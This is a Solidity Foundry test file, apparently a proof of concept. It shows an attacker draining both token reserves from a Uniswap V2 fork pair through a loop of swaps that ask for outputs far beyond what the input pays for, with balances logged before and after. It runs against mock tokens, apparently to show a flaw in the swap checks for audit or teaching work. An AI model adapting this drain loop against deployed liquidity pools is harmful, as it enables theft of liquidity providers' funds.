// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {UniswapV2Fork} from "../src/UniswapV2Fork.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract UniswapV2ForkFactory {
    function feeTo() external pure returns (address) {
        // Placeholder implementation
        return address(0);
    }
}

contract UniswapV2ForkTest is Test {
    UniswapV2Fork public pair;
    UniswapV2ForkFactory public factory;
    ERC20Mock public token0;
    ERC20Mock public token1;

    address public attacker = makeAddr("attacker");
    address public lp = makeAddr("lp");

    uint256 public constant DECIMALS = 18;
    uint256 public constant INITIAL_LIQUIDITY = 1000 * 10 ** DECIMALS;
    uint256 public constant ATTACKER_INTIAL_BALANCE = 3 * INITIAL_LIQUIDITY;

    uint256 public constant PRECISION = 10000;
    uint256 public constant FEE = 16;

    string public constant NAME = "CoolToken";
    string public constant SYMBOL = "COOL";

    function setUp() public {
        factory = new UniswapV2ForkFactory();
        token0 = new ERC20Mock();
        token1 = new ERC20Mock();

        vm.startPrank(address(factory));
        pair = new UniswapV2Fork(NAME, SYMBOL);
        pair.initialize(address(token0), address(token1));
        vm.stopPrank();

        token0.mint(lp, INITIAL_LIQUIDITY);
        token1.mint(lp, INITIAL_LIQUIDITY);
        token0.mint(attacker, ATTACKER_INTIAL_BALANCE);

        vm.startPrank(lp);
        token0.transfer(address(pair), INITIAL_LIQUIDITY);
        token1.transfer(address(pair), INITIAL_LIQUIDITY);
        vm.stopPrank();

        pair.mint(lp);
    }

    function getAmountOut(
        uint256 amountIn,
        bool zeroForOne
    ) internal view returns (uint256 amount0Out, uint256 amount1Out) {
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();

        (uint112 reserveIn, uint112 reserveOut) = zeroForOne
            ? (reserve0, reserve1)
            : (reserve1, reserve0);
        uint256 feeTerm = PRECISION - FEE;

        uint256 amountOut = ((amountIn * feeTerm * reserveOut)) /
            (reserveIn * PRECISION + (amountIn * feeTerm));

        (amount0Out, amount1Out) = zeroForOne
            ? (uint256(0), 10 * amountOut)
            : (10 * amountOut, uint256(0));
    }

    function test_drainPool() public {
        uint256 amountIn = 1 * 10 ** DECIMALS;
        uint256 amountOut = 100 * amountIn;

        console.log(
            "attacker's initial Token0 balance: ",
            token0.balanceOf(attacker)
        );
        console.log(
            "attacker's initial Token1 balance: ",
            token1.balanceOf(attacker)
        );

        uint256 balanceToken0After;
        uint256 balanceToken1After;

        bool zeroForOne = true;

        while (token1.balanceOf(address(pair)) > 0) {
            vm.startPrank(attacker);

            if (zeroForOne) {
                if (token1.balanceOf(address(pair)) <= amountOut) {
                    if (token1.balanceOf(address(pair)) == 1) {
                        zeroForOne = false;
                        amountOut = 100 * amountIn;

                        balanceToken0After = token0.balanceOf(address(pair));
                        balanceToken1After = token1.balanceOf(address(pair));

                        console.log(
                            "Pair's Token0 balance after drain: ",
                            balanceToken0After
                        );
                        console.log(
                            "Pair's Token1 balance after drain: ",
                            balanceToken1After
                        );

                        continue;
                    } else {
                        amountOut /= 100;
                    }
                }
                token0.transfer(address(pair), amountIn);
                pair.swap(0, amountOut, attacker, "");
            } else {
                if (token0.balanceOf(address(pair)) <= amountOut) {
                    if (token0.balanceOf(address(pair)) == 100) {
                        break;
                    }
                    amountOut /= 100;
                }
                token1.transfer(address(pair), amountIn);
                pair.swap(amountOut, 0, attacker, "");
            }

            vm.stopPrank();
        }

        balanceToken0After = token0.balanceOf(address(pair));
        balanceToken1After = token1.balanceOf(address(pair));

        console.log("Pair's Token0 balance after drain: ", balanceToken0After);
        console.log("Pair's Token1 balance after drain: ", balanceToken1After);

        console.log(
            "attacker's final Token0 balance: ",
            token0.balanceOf(attacker)
        );
        console.log(
            "attacker's final Token1 balance: ",
            token1.balanceOf(attacker)
        );
    }
}
